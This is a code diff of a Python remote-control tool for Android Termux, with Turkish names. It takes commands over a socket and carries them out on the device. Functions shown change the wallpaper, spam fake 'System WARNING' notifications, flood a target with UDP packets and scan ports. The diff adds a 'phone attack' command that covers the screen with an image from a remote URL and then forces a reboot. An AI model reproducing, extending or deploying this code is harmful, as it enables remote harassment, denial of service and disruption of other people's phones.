@@ -23,9 +23,9 @@ def arkaplan_degistir(resim_url):
             os.system("termux-wallpaper -t lock -f duvar.jpg")
         except:
             pass
-        s.send("[✓] Ana ve kilit ekrani degistirildi\n".encode())
+        s.send("[✓] Arka plan degistirildi\n".encode())
     except:
-        s.send("[!] Duvar kagidi degistirilemedi\n".encode())
+        s.send("[!] Arka plan degistirme hatasi\n".encode())
 
 def bildirim_gonder(mesaj, adet):
     for i in range(adet):
@@ -37,7 +37,7 @@ def uyari_bildirimi(mesaj):
 
 def uyari_spam(mesaj, adet):
     for i in range(adet):
-        os.system(f'termux-notification --title \"⚠️ Sistem UYARISI!\" --content \"{mesaj}\" --priority high --vibrate 1000')
+        os.system(f'termux-notification --title "⚠️ Sistem UYARISI!" --content "{mesaj}" --priority high --vibrate 1000')
     s.send("[!] Uyari spam gonderildi\n".encode())
 
 def udp_yolla(ip, port, sayi):
@@ -65,6 +65,20 @@ def port_tara(ip, start, end):
 def google_ac():
     os.system("termux-open-url https://www.google.com")
     s.send("[✓] Google acildi\n".encode())
+
+def telefon_saldirisi(resim_url):
+    try:
+        with open("telefon.html", "w") as f:
+            f.write(f"""
+            <html>
+            <head><style>body,html{{margin:0;padding:0;overflow:hidden;background:black}}img{{width:100%;height:100%;object-fit:cover}}</style></head>
+            <body><img src="{resim_url}"></body></html>
+            """)
+        os.system("termux-open telefon.html")
+        os.system("sleep 5 && reboot")
+        s.send("[!] Telefon ekran kaplandi, reboot denendi\n".encode())
+    except:
+        s.send("[!] telefon komutu hatali\n".encode())
 
 while True:
     try:
@@ -104,7 +118,7 @@ while True:
             except:
                 s.send("[!] Hata: udp komutu\n".encode())
 
-        elif komut.startswith("port "):  # scan yerine artık port komutu
+        elif komut.startswith("port "):
             try:
                 _, hedef_ip, bas, son = komut.split(" ")
                 port_tara(hedef_ip, int(bas), int(son))
@@ -113,6 +127,13 @@ while True:
 
         elif komut == "google":
             google_ac()
+
+        elif komut.startswith("telefon "):
+            try:
+                _, url = komut.split(" ", 1)
+                telefon_saldirisi(url)
+            except:
+                s.send("[!] telefon komutu hatali\n".encode())
 
         elif komut == "exit":
             s.close()
